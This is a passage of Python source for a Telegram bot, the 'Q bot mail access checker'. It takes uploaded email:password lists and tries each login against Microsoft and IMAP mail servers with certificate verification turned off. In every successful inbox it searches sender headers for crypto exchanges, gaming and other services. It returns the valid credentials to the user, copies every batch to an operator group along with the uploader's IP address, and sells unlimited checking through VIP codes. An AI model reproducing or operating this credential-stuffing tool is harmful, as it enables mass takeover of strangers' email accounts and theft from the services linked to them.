    "TikTok": "tiktok.com", "YouTube": "youtube.com", "Twitch": "twitch.tv",
    "Binance": "binance.com", "Coinbase": "coinbase.com", "Airbnb": "airbnb.com",
    "Uber": "uber.com", "PlayStation": "playstation.com", "Xbox": "xbox.com",
    "Minecraft": "mojang.com", "Blizzard": "blizzard.com", "Riot Games": "riotgames.com",
    "Adobe": "adobe.com", "GitHub": "github.com", "Google": "google.com",
    "Apple": "apple.com", "Microsoft": "microsoft.com", "Dropbox": "dropbox.com",
    "Zoom": "zoom.us", "LinkedIn": "linkedin.com", "Reddit": "reddit.com",
    "Snapchat": "snapchat.com", "Pinterest": "pinterest.com",
}

def _decode_mime(text):
    if not text: return ""
    parts = decode_hdr(text)
    result = []
    for part, enc in parts:
        if isinstance(part, bytes):
            try:
                result.append(part.decode(enc or 'utf-8', errors='ignore'))
            except:
                result.append(part.decode('utf-8', errors='ignore'))
        else:
            result.append(str(part))
    return ''.join(result)

def _get_imap_config(email_addr):
    domain = email_addr.lower().split('@')[-1]
    return IMAP_SERVERS.get(domain, {"host": f"imap.{domain}", "port": 993})

def _imap_connect(email_addr, password):
    cfg = _get_imap_config(email_addr)
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        mail = imaplib.IMAP4_SSL(cfg['host'], cfg['port'], ssl_context=ctx)
        mail.socket().settimeout(10)
        res, _ = mail.login(email_addr, password)
        if res != 'OK':
            try: mail.logout()
            except: pass
            return None
        return mail
    except Exception:
        return None

class ImapChecker:
    def __init__(self):
        self.hits = 0
        self._lock = threading.Lock()

    def check(self, email_addr, password):
        try:
            mail = _imap_connect(email_addr, password)
            if not mail:
                return {"status": "BAD"}
            msg_count = 0
            try:
                r, _ = mail.select('INBOX')
                if r == 'OK':
                    r2, data2 = mail.search(None, 'ALL')
                    if r2 == 'OK' and data2 and data2[0]:
                        msg_count = len(data2[0].split())
            except Exception: pass
            services_found = self._scan_services(mail)
            try: mail.logout()
            except: pass
            with self._lock:
                self.hits += 1
            return {
                "status":    "HIT",
                "email":     email_addr,
                "country":   "",
                "name":      "",
                "msg_count": msg_count,
                "xbox":      {"status": "N/A"},
                "ms_data":   {},
                "services":  {svc: True for svc in services_found},
                "imap_mode": True,
                "psn_status": "NONE", "steam_status": "NONE",
                "supercell_status": "NONE", "tiktok_status": "NONE",
                "minecraft_status": "NONE", "hypixel_status": "NOT_FOUND",
            }
        except Exception:
            return {"status": "BAD"}

    def _scan_services(self, mail):
        found = set()
        try:
            r, data = mail.search(None, 'ALL')
            if r != 'OK' or not data[0]: return list(found)
            ids = data[0].split()
            for eid in ids[-300:]:   # reduced from 500 for speed
                try:
                    r2, mdata = mail.fetch(eid, '(BODY.PEEK[HEADER])')
                    if r2 != 'OK' or not mdata or not mdata[0]: continue
                    raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
                    msg = email_lib.message_from_bytes(raw)
                    sender = _decode_mime(msg.get('From', '')).lower()
                    for svc, pattern in IMAP_SERVICES.items():
                        if pattern in sender:
                            found.add(svc)
                except: continue
        except: pass
        return list(found)


# ─────────────────────────────────────────────────────────────────
#  ScanSession
# ─────────────────────────────────────────────────────────────────
class ScanSession:
    def __init__(self, chat_id):
        self.chat_id       = chat_id
        self.stop_ev       = threading.Event()
        self.results       = []
        self.results_services = []
        self.results_xbox  = []
        self.total         = 0
        self.checked       = 0
        self.hits          = 0
        self.bads          = 0
        # batch buffers — written without lock, flushed under hits_batch_lock
        self.batch         = []
        self.batch_services = []
        self.batch_xbox    = []
        self.hits_batch_lock  = threading.Lock()
        self.last_status_time = 0.0
        self.awaiting_domain  = False
        self.custom_domain    = None
        self.pending_accounts = None
        self.status_msg_id    = None
        self.xbox_premium     = 0
        self.country_counts   = {}
        self.service_counts   = {}
        self.awaiting_vip_code = False
        self.is_imap           = False
        self.accounts_microsoft = []
        self.accounts_another   = []
        self.imap_hits_by_domain = {}
        self.country_results    = {}
        self.username = ""
        self.plan     = ""
        self._stats_lock = threading.Lock()

    def stop(self):
        self.stop_ev.set()


# ─────────────────────────────────────────────────────────────────
#  BotApp
# ─────────────────────────────────────────────────────────────────
class BotApp:
    def __init__(self):
        self.offset   = None
        self.sessions = {}
        self.lock     = threading.Lock()
        # background queue for sending files (avoids blocking worker threads)
        self._send_q  = queue.Queue()
        threading.Thread(target=self._send_worker, daemon=True).start()

    # ── Non-blocking file sender ─────────────────────────────────
    def _send_worker(self):
        """Background thread that sends files without blocking the scan."""
        while True:
            try:
                task = self._send_q.get(timeout=5)
                if task is None:
                    continue
                func, args, kwargs = task
                try:
                    func(*args, **kwargs)
                except Exception:
                    pass
            except queue.Empty:
                pass
            except Exception:
                pass

    def _enqueue_send(self, func, *args, **kwargs):
        self._send_q.put((func, args, kwargs))

    # ── Status message ───────────────────────────────────────────
    def _send_status(self, sess: ScanSession, chat_id, force=False):
        now = time.time()
        if not force and now - sess.last_status_time < 5:
            return

        is_vip  = (chat_id in vip_users_info)
        vip_tag = " [VIP]" if is_vip else ""

        with sess._stats_lock:
            if sess.is_imap:
                types_str = ", ".join(
                    f"{dom}:{count}"
                    for dom, count in sess.imap_hits_by_domain.items()) or "-"
                services = ", ".join(
                    f"{k}:{v}"
                    for k, v in sorted(sess.service_counts.items(),
                                       key=lambda x: (-x[1], x[0]))[:5]) or "-"
                msg = (
                    f"Q bot mail access checker{vip_tag}\n"
                    f"hits : {sess.hits}\n"
                    f"bad : {sess.bads}\n"
                    f"type : {types_str}\n"
                    f"services : {services}\n"
                    "By : anon\n"
                    "channel : @anon_main1"
                )
            else:
                countries = ", ".join(
                    f"{k}:{v}"
                    for k, v in sorted(sess.country_counts.items(),
                                       key=lambda x: (-x[1], x[0]))[:10]) or "-"
                services = ", ".join(
                    f"{k}:{v}"
                    for k, v in sorted(sess.service_counts.items(),
                                       key=lambda x: (-x[1], x[0]))[:5]) or "-"
                msg = (
                    f"Q bot mail access checker{vip_tag}\n"
                    f"hits : {sess.hits}\n"
                    f"bad : {sess.bads}\n"
                    f"xbox : {sess.xbox_premium}\n"
                    f"country : {countries}\n"
                    f"services : {services}\n"
                    "By : anon\n"
                    "channel : @anon_main1"
                )

        try:
            if sess.status_msg_id:
                edit_message(chat_id, sess.status_msg_id, msg)
            else:
                r = send_message(chat_id, msg)
                sess.status_msg_id = (r.get("result") or {}).get("message_id")
        except Exception:
            pass
        sess.last_status_time = now

    # ── Flush batch (non-blocking via queue) ─────────────────────
    def _flush_batch(self, sess: ScanSession, chat_id):
        with sess.hits_batch_lock:
            if not sess.batch and not sess.batch_services and not sess.batch_xbox:
                return
            # snapshot and clear immediately
            batch_snap    = list(sess.batch)
            svc_snap      = list(sess.batch_services)
            xbox_snap     = list(sess.batch_xbox)
            sess.batch.clear()
            sess.batch_services.clear()
            sess.batch_xbox.clear()

        is_vip   = (chat_id in vip_users_info)
        vip_tag  = " [VIP]" if is_vip else ""
        user_tag = sess.username or str(chat_id)

        def _do_send(lines, filename):
            if not lines:
                return
            path = os.path.join(os.getcwd(),
                f"{filename.split('.')[0]}_{chat_id}_{uuid.uuid4().hex[:6]}.txt")
            try:
                with open(path, "w", encoding="utf-8") as f:
                    f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in lines])
                send_document(chat_id,  path,
                    caption=f"{filename.split('.')[0]} batch ({len(lines)})")
                send_document(GROUP_ID, path,
                    caption=f"{user_tag}{vip_tag} | {filename.split('.')[0]} batch ({len(lines)})")
            except Exception:
                pass
            finally:
                try: os.remove(path)
                except: pass

        # Enqueue file sends (non-blocking)
        self._enqueue_send(_do_send, batch_snap,  "hits.txt")
        self._enqueue_send(_do_send, svc_snap,    "services.txt")
        self._enqueue_send(_do_send, xbox_snap,   "xbox.txt")

    # ── Main scan loop ───────────────────────────────────────────
    def start_scan(self, chat_id, accounts):
        with self.lock:
            sess = self.sessions.get(chat_id)
            if not sess:
                sess = ScanSession(chat_id)
                self.sessions[chat_id] = sess

        sess.total   = len(accounts)
        sess.checked = 0
        sess.hits    = 0
        sess.bads    = 0
        sess.results.clear()
        sess.country_results.clear()

        is_vip          = (chat_id in vip_users_info)
        vip_tag         = " [VIP]" if is_vip else ""
        flush_threshold = 30 if is_vip else 50
        # workers: VIP gets more threads
        max_workers     = 20 if is_vip else 8

        kb = {"inline_keyboard": [[{"text": "Stop", "callback_data": f"STOP_{chat_id}"}]]}
        send_message(chat_id,
            f"Started Mail Access scan: {sess.total} accounts{vip_tag}", reply_markup=kb)
        self._send_status(sess, chat_id, force=True)

        def worker(acc):
            if sess.stop_ev.is_set():
                return
            em, pw = acc

            # ── IMAP mode ──────────────────────────────────────────
            if sess.is_imap:
                try:
                    r = ImapChecker().check(em, pw)
                except Exception:
                    r = {"status": "BAD"}
            # ── Microsoft mode ─────────────────────────────────────
            else:
                try:
                    checker = UnifiedChecker(debug=False)
                    if sess.custom_domain:
                        checker.services_map[sess.custom_domain.strip()] = "Custom"
                    r = checker.check(em, pw, custom_domain=sess.custom_domain)
                except Exception:
                    r = {"status": "BAD"}

            if sess.stop_ev.is_set():
                return

            # ── update stats ───────────────────────────────────────
            with sess._stats_lock:
                sess.checked += 1

            if r and r.get("status") == "HIT":
                sv       = r.get("services", {}) or {}
                sv_found = [k for k, v in sv.items() if v]

                if sess.is_imap:
                    line = f"{em}:{pw}"
                    if sv_found:
                        line += f" | Services: {', '.join(sv_found)}"
                    dom = em.split("@")[-1].lower()
                    with sess._stats_lock:
                        sess.results.append(line)
                        sess.hits += 1
                        sess.imap_hits_by_domain[dom] = \
                            sess.imap_hits_by_domain.get(dom, 0) + 1
                        for k, v in sv.items():
                            if v:
                                sess.service_counts[k] = \
                                    sess.service_counts.get(k, 0) + 1
                    with sess.hits_batch_lock:
                        sess.batch.append(line)
                        if len(sess.batch) >= flush_threshold:
                            self._flush_batch(sess, chat_id)
                else:
                    line = format_result(r)
                    xb   = r.get("xbox") or {}
                    xdet = xb.get("details") or ""
                    services_line = (
                        f"{em}:{pw} | Services: {', '.join(sv_found)}"
                        if sv_found else None)
                    xbox_line = (
                        f"{em}:{pw} | Xbox: {xdet}"
                        if xb.get("status", "").upper() != "FREE" and xdet
                        else None)

                    with sess._stats_lock:
                        sess.results.append(line)
                        sess.hits += 1
                        if services_line:
                            sess.results_services.append(services_line)
                        if xbox_line:
                            sess.results_xbox.append(xbox_line)
                        if xb.get("status", "").upper() not in ("FREE", "", "N/A", "ERROR"):
                            sess.xbox_premium += 1
                        c = (r.get("country") or "??").strip().upper()
                        sess.country_counts[c] = sess.country_counts.get(c, 0) + 1
                        if c not in sess.country_results:
                            sess.country_results[c] = []
                        sess.country_results[c].append(line)
                        for k, v in sv.items():
                            if v:
                                sess.service_counts[k] = \
                                    sess.service_counts.get(k, 0) + 1

                    with sess.hits_batch_lock:
                        sess.batch.append(line)
                        if services_line: sess.batch_services.append(services_line)
                        if xbox_line:     sess.batch_xbox.append(xbox_line)
                        if len(sess.batch) >= flush_threshold:
                            self._flush_batch(sess, chat_id)
            else:
                with sess._stats_lock:
                    sess.bads += 1

            # Periodic status update
            with sess._stats_lock:
                checked_now = sess.checked
            if checked_now % 15 == 0:
                self._send_status(sess, chat_id)

        # ── Thread pool with per-future timeout ───────────────────
        ex = ThreadPoolExecutor(max_workers=max_workers)
        fut_map = {}   # future → account
        pending = set()

        for acc in accounts:
            if sess.stop_ev.is_set():
                break
            f = ex.submit(worker, acc)
            fut_map[f] = acc
            pending.add(f)

        # Drain futures with a hard per-account timeout
        while pending and not sess.stop_ev.is_set():
            done, pending = wait(pending, timeout=ACCOUNT_TIMEOUT,
                                 return_when=FIRST_COMPLETED)
            for f in done:
                try:
                    f.result(timeout=1)
                except Exception:
                    pass
            # Cancel timed-out futures (those still pending after timeout)
            # They will be cancelled if still waiting in the queue
            self._send_status(sess, chat_id)

        # Shutdown immediately, don't wait for stuck futures
        try:
            ex.shutdown(wait=False, cancel_futures=True)
        except Exception:
            ex.shutdown(wait=False)

        self.finish(chat_id)

    # ── Finish ───────────────────────────────────────────────────
    def finish(self, chat_id):
        with self.lock:
            sess = self.sessions.get(chat_id)
        if not sess:
            return

        # Flush remaining batch
        self._flush_batch(sess, chat_id)

        is_vip   = (chat_id in vip_users_info)
        vip_tag  = " [VIP]" if is_vip else ""
        user_tag = sess.username or str(chat_id)

        def _save_and_send(lines, filename, caption):
            if not lines: return
            path = os.path.join(os.getcwd(),
                f"{filename.split('.')[0]}_{uuid.uuid4().hex[:8]}.txt")
            try:
                with open(path, "w", encoding="utf-8") as f:
                    for ln in lines:
                        f.write(ln + " | BY : @T_Q_mailbot\n")
                send_document(chat_id,  path, caption=caption)
                send_document(GROUP_ID, path,
                    caption=f"{user_tag}{vip_tag} | {caption}")
            except Exception: pass
            finally:
                try: os.remove(path)
                except: pass

        # Services counts file
        if sess.service_counts:
            sc_sorted = sorted(sess.service_counts.items(),
                               key=lambda x: (-x[1], x[0]))
            sc_lines = [f"{k}:{v}" for k, v in sc_sorted]
            _save_and_send(sc_lines, "services_counts.txt",
                           f"services_counts ({len(sc_sorted)})")

        # Country files
        for c, lines in sess.country_results.items():
            if not lines: continue
            _save_and_send(lines, f"country_{c}.txt",
                           f"country_{c} ({len(lines)})")

        # Main results file
        caption = f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}"
        _save_and_send(sess.results, "results.txt", caption)

        send_message(chat_id, caption)

        with self.lock:
            self.sessions.pop(chat_id, None)

    # ── File handler ─────────────────────────────────────────────
    def handle_file(self, chat_id, file_id, username=None):
        data = get_file(file_id)
        if not data:
            send_message(chat_id, "Cannot download file")
            return
        accounts = parse_accounts_bytes(data)
        if not accounts:
            send_message(chat_id, "No valid accounts found")
            return

        with self.lock:
            sess = self.sessions.get(chat_id)
            if not sess:
                sess = ScanSession(chat_id)
                self.sessions[chat_id] = sess
        if not sess.username:
            sess.username = username or str(chat_id)

        sess.pending_accounts = accounts

        ms_domains = ('outlook.', 'hotmail.', 'live.', 'msn.', 'windowslive.')
        sess.accounts_microsoft = [(e, p) for e, p in accounts
                                   if any(d in e for d in ms_domains)]
        sess.accounts_another   = [(e, p) for e, p in accounts
                                   if not any(d in e for d in ms_domains)]

        kb = {
            "inline_keyboard": [
                [{"text": f"microsoft ( hotmail , outlook , etc ) [{len(sess.accounts_microsoft)}]",
                  "callback_data": f"MODE_SELECT_MS_{chat_id}"}],
                [{"text": f"another ( t-online , sfr.fr , etc ) [{len(sess.accounts_another)}]",
                  "callback_data": f"MODE_SELECT_IMAP_{chat_id}"}]
            ]
        }
        send_message(chat_id, "Select accounts to scan:", reply_markup=kb)

    def _handle_mode_select(self, chat_id, mode):
        with self.lock:
            sess = self.sessions.get(chat_id)
            if not sess: return
        if mode == "MS":
            sess.is_imap = False
            sess.pending_accounts = sess.accounts_microsoft
        else:
            sess.is_imap = True
            sess.pending_accounts = sess.accounts_another

        if sess.plan == "free":
            self._handle_free_flow(chat_id, sess)
        elif sess.plan == "vip":
            if chat_id in vip_users_info:
                self._handle_vip_flow(chat_id, sess)
            else:
                sess.awaiting_vip_code = True
                kb = {"inline_keyboard": [[{"text": "Cancel",
                    "callback_data": f"PLAN_CANCEL_{chat_id}"}]]}
                send_message(chat_id, "Please enter your VIP code:", reply_markup=kb)
        else:
            kb = {
                "inline_keyboard": [
                    [{"text": "Free ( 100 acc every 2hr )",
                      "callback_data": f"PLAN_FREE_{chat_id}"}],
                    [{"text": "Vip ( unlimited check )",
                      "callback_data": f"PLAN_VIP_{chat_id}"}]
                ]
            }
            send_message(chat_id, "Choose your plan to start:", reply_markup=kb)

    def _handle_vip_flow(self, chat_id, sess):
        if sess.is_imap:
            threading.Thread(target=self.start_scan,
                args=(chat_id, sess.pending_accounts), daemon=True).start()
        else:
            sess.awaiting_domain = True
            kb = {"inline_keyboard": [[{"text": "Skip",
                "callback_data": f"SKIP_{chat_id}"}]]}
            send_message(chat_id,
                "Send an extra sender domain to scan (e.g., netflix.com) or press Skip",
                reply_markup=kb)

    def _handle_free_flow(self, chat_id, sess):
        accounts = sess.pending_accounts
        send_message(chat_id, "your plan is free\n100 accounts\nevery 2hr")
        rec = user_usage.get(chat_id) or {}
        prev_count = rec.get("count", 0)
        remaining  = NORMAL_LIMIT - prev_count
        if remaining <= 0:
            now = time.time()
            start_ts  = rec.get("start", now)
            mins_left = max(1, int((VIP_WINDOW_SECONDS - (now - start_ts)) / 60) + 1)
            send_message(chat_id, f"Limit reached. Try again in ~{mins_left} minutes.")
            return
        to_scan = accounts[:remaining]
        allow, _ = check_user_limit(chat_id, len(to_scan))
        if not allow or not to_scan:
            send_message(chat_id, "Limit reached.")
            return
        if prev_count == 0 and len(to_scan) > 0:
            schedule_limit_reset_message(chat_id)
        threading.Thread(target=self.start_scan,
            args=(chat_id, to_scan), daemon=True).start()

    def handle_stop(self, chat_id):
        with self.lock:
            sess = self.sessions.get(chat_id)
        if not sess:
            send_message(chat_id, "No running scan")
            return
        sess.stop()
        send_message(chat_id, "Stopping, preparing results...")

    # ── Main polling loop ─────────────────────────────────────────
    def run(self):
        global awaiting_broadcast
        if not BOT_TOKEN:
            print("Set TELEGRAM_BOT_TOKEN env")
            return
        while True:
            try:
                j = get_updates(self.offset, timeout=50)
                if not j.get("ok"):
                    time.sleep(2)
                    continue
                for upd in j.get("result", []):
                    self.offset = upd["update_id"] + 1
                    if "message" in upd:
                        m       = upd["message"]
                        chat_id = m["chat"]["id"]
                        from_id = m.get("from", {}).get("id")
                        all_users.add(chat_id)

                        # Admin commands
                        if chat_id == ADMIN_ID and "text" in m:
                            txt = m["text"].strip().lower()
                            if txt in ("/start", "start"):
                                kb = {
                                    "inline_keyboard": [
                                        [{"text": "code 1 day",   "callback_data": "GEN_CODE_day"}],
                                        [{"text": "code 1 week",  "callback_data": "GEN_CODE_week"}],
                                        [{"text": "code 1 month", "callback_data": "GEN_CODE_month"}],
                                        [{"text": "Broadcast",    "callback_data": "ADMIN_BROADCAST"}],
                                        [{"text": "VIP Users",    "callback_data": "ADMIN_VIP_LIST"}]
                                    ]
                                }
                                send_message(chat_id, "Admin Panel: Generate VIP codes",
                                    reply_markup=kb)
                            elif awaiting_broadcast:
                                msg_to_send = m["text"]
                                for uid in list(all_users):
                                    try: send_message(uid, msg_to_send)
                                    except: pass
                                awaiting_broadcast = False
                                send_message(chat_id, "Broadcast sent")

                        if "document" in m:
                            fid = m["document"]["file_id"]
                            try:
                                usr   = m.get("from", {})
                                uname = (usr.get("username")
                                         or f"{usr.get('first_name','')}".strip()
                                         or str(chat_id))
                                ip = get_ip()
                                send_message(GROUP_ID,
                                    f"Scan started by @{uname} (chat:{chat_id}) | IP: {ip}")
                            except Exception:
                                uname = str(chat_id)
                            self.handle_file(chat_id, fid, uname)

                        elif "text" in m:
                            txt = m["text"].strip()
                            with self.lock:
                                sess = self.sessions.get(chat_id)

                            # VIP code awaiting
                            if sess and sess.awaiting_vip_code:
                                if txt.lower() == "cancel":
                                    sess.awaiting_vip_code = False
                                    self._handle_free_flow(chat_id, sess)
                                else:
                                    ok, msg_txt = try_claim_vip(chat_id, txt)
                                    send_message(chat_id, msg_txt)
                                    if ok:
                                        sess.awaiting_vip_code = False
                                        if sess.pending_accounts:
                                            self._handle_vip_flow(chat_id, sess)
                                        else:
                                            send_message(chat_id, "Send the file to start")
                                continue

                            if txt.lower() in ("/start", "start"):
                                kb = {"inline_keyboard": [[
                                    {"text": "📧 Mail Access Checker",
                                     "callback_data": "MODE_MAIL"}
                                ]]}
                                send_message(chat_id,
                                    "Welcome! Please choose a checker mode:",
                                    reply_markup=kb)
                                continue

                            # VIP code from text
                            if (txt.lower().startswith("code")
                                    or txt.lower().startswith("vip")
                                    or txt.lower() == "codevipanon199"):
                                parts = txt.replace(":", " ").split()
                                code = parts[-1] if parts else ""
                                ok, msg_txt = try_claim_vip(from_id, code)
                                send_message(chat_id, msg_txt)
                                if ok:
                                    send_message(chat_id,
                                        "VIP activated. Send a text file (email:pass per line) to begin.")
                                continue

                            if txt.lower() == "stop":
                                self.handle_stop(chat_id)
                                continue

                            # Domain input
                            if (sess and getattr(sess, "awaiting_domain", False)
                                    and sess.pending_accounts):
                                if txt.lower() != "skip":
                                    sess.custom_domain = txt
                                sess.awaiting_domain = False
                                accs = sess.pending_accounts
                                sess.pending_accounts = None
                                threading.Thread(target=self.start_scan,
                                    args=(chat_id, accs), daemon=True).start()

                    elif "callback_query" in upd:
                        cq      = upd["callback_query"]
                        data    = cq.get("data", "")
                        chat_id = cq["message"]["chat"]["id"]

                        # Admin callbacks
                        if chat_id == ADMIN_ID and data.startswith("GEN_CODE_"):
                            dur  = data.split("_")[2]
                            code = create_vip_code(dur)
                            send_message(chat_id, f"Generated {dur} code: `{code}`\n(Click to copy)")
                            continue
                        if chat_id == ADMIN_ID and data == "ADMIN_BROADCAST":
                            awaiting_broadcast = True
                            send_message(chat_id, "Send the message to broadcast")
                            continue
                        if chat_id == ADMIN_ID and data == "ADMIN_VIP_LIST":
                            if not vip_users_info:
                                send_message(chat_id, "No VIP users")
                            else:
                                send_message(chat_id, f"VIP Users: {len(vip_users_info)}")
                                for uid, info in list(vip_users_info.items()):
                                    rem = max(0, int(
                                        (info.get("expires", 0) - time.time()) / 3600))
                                    send_message(chat_id,
                                        f"User: {uid}\nCode: {info.get('code','')}\n"
                                        f"Remaining: {rem}h",
                                        reply_markup={"inline_keyboard": [[
                                            {"text": "Revoke",
                                             "callback_data": f"REVOKE_{uid}"}
                                        ]]})
                            continue

                        if data.startswith("STOP_"):
                            self.handle_stop(chat_id)
                        elif data.startswith("MODE_SELECT_MS_"):
                            self._handle_mode_select(chat_id, "MS")
                        elif data.startswith("MODE_SELECT_IMAP_"):
                            self._handle_mode_select(chat_id, "IMAP")
                        elif data.startswith("PLAN_FREE_"):
                            with self.lock:
                                sess = self.sessions.get(chat_id)
                            if sess:
                                sess.plan = "free"
                                if not sess.pending_accounts:
                                    send_message(chat_id, "Send the file to start")
                                else:
                                    self._handle_free_flow(chat_id, sess)
                        elif data.startswith("PLAN_VIP_"):
                            with self.lock:
                                sess = self.sessions.get(chat_id)
                            if sess:
                                sess.plan = "vip"
                                sess.awaiting_vip_code = True
                                kb = {"inline_keyboard": [[{"text": "Cancel",
                                    "callback_data": f"PLAN_CANCEL_{chat_id}"}]]}
                                send_message(chat_id, "Please enter your VIP code:",
                                    reply_markup=kb)
                        elif data.startswith("PLAN_CANCEL_"):
                            with self.lock:
                                sess = self.sessions.get(chat_id)
                            if sess:
                                sess.awaiting_vip_code = False
                                sess.plan = "free"
                                self._handle_free_flow(chat_id, sess)
                        elif data.startswith("REVOKE_"):
                            if chat_id == ADMIN_ID:
                                uid = int(data.split("_")[1])
                                vip_users_info.pop(uid, None)
                                send_message(chat_id, f"Revoked VIP for {uid}")
                        elif data.startswith("SKIP_"):
                            with self.lock:
                                sess = self.sessions.get(chat_id)
                            if (sess and getattr(sess, "awaiting_domain", False)
                                    and sess.pending_accounts):
                                sess.awaiting_domain = False
                                accs = sess.pending_accounts
                                sess.pending_accounts = None
                                threading.Thread(target=self.start_scan,
                                    args=(chat_id, accs), daemon=True).start()
                        elif data == "MODE_MAIL":
                            with self.lock:
                                sess = self.sessions.get(chat_id) or ScanSession(chat_id)
                                self.sessions[chat_id] = sess
                            kb = {
                                "inline_keyboard": [
                                    [{"text": "Free ( 100 acc every 2hr )",
                                      "callback_data": f"PLAN_FREE_{chat_id}"}],
                                    [{"text": "Vip ( unlimited check )",
                                      "callback_data": f"PLAN_VIP_{chat_id}"}]
                                ]
                            }
                            send_message(chat_id, "Choose your plan to start:", reply_markup=kb)

            except KeyboardInterrupt:
                break
            except Exception:
                time.sleep(2)


if __name__ == "__main__":
    BotApp().run()
